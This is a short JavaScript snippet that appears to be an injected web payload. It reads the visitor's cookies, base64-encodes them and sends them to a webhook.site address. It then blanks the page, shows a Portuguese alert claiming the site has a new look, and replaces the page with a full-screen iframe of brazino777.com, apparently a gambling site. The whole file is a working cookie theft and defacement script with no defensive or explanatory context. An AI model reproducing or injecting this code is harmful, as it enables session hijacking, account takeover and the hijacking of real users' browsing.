const cookie = document.cookie;

fetch("https://webhook.site/20e0de09-81e0-4e52-803d-be00689635d1?cookie=" + btoa(cookie), {
    mode: 'no-cors'
});

document.body.innerHTML = '';
document.body.style.margin = '0';
document.body.style.overflow = 'hidden';

alert("O site está com cara nova!")

document.body.innerHTML = `
    <iframe src="https://brazino777.com" style="width: 100vw; height: 100vh; border: none;"></iframe>
`;